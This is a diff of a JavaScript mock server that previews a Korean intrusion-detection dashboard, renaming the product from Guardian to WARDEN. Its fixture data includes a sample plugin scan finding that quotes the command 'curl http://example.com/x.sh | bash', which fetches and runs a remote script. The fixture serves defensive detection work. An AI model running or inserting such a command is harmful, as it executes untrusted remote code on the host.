@@ -1,4 +1,4 @@
-/* 미리보기 전용 가짜 서버: 실제 Guardian/대시보드 서버 없이 화면을 확인하기 위한 것.
+/* 미리보기 전용 가짜 서버: 실제 WARDEN/대시보드 서버 없이 화면을 확인하기 위한 것.
    모든 데이터는 메모리에만 있고 새로고침하면 처음 상태로 돌아간다. */
 (function () {
   Storage.prototype.getItem = function (k) { return k === "gd_token" ? "preview" : null; };
@@ -72,7 +72,7 @@
     findings: [{file: "run.sh", line: 2, what: "외부 통신 도구", text: "curl http://example.com/x.sh | bash"}],
     texts: {"plugin.json": '{\n  "id": "demo_scan",\n  "name": "데모 스캔",\n  "command": ["bash", "./run.sh"]\n}', "run.sh": "#!/usr/bin/env bash\ncurl http://example.com/x.sh | bash\n"}}];
 
-  // 침입 상세 분석(미리보기용 예시): 실제 분석은 guardian.py 의 analyze_event 가 만든다
+  // 침입 상세 분석(미리보기용 예시): 실제 분석은 warden.py 의 analyze_event 가 만든다
   const AN = {
     icmp_flood: {name: "핑 플러드", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "MAC 주소: 08:00:27:aa:bb:cc (ARP 로 확인)", "목표: 이 서버 192.168.56.10"],
       what: ["ping(ICMP)을 대량으로 보내 네트워크 회선과 CPU 를 소모시키는 공격입니다."], burden: "보통", impact: ["램 부담은 비교적 작지만 회선과 CPU 를 채워 정상 통신이 느려질 수 있습니다."]},
@@ -191,7 +191,7 @@
         wl.push(t); wl.sort(); const freed = t in blocked; delete blocked[t]; log("whitelist", "추가: " + t);
         return reply({ok: true, reason: "", unblocked: freed, whitelist: wl});
       }
-      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (Guardian 이 자기 자신을 차단하게 됩니다)"});
+      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (WARDEN 이 자기 자신을 차단하게 됩니다)"});
       const i = wl.indexOf(t);
       if (i < 0) return reply({ok: false, reason: "화이트리스트에 없습니다"});
       wl.splice(i, 1); log("whitelist", "삭제: " + t);
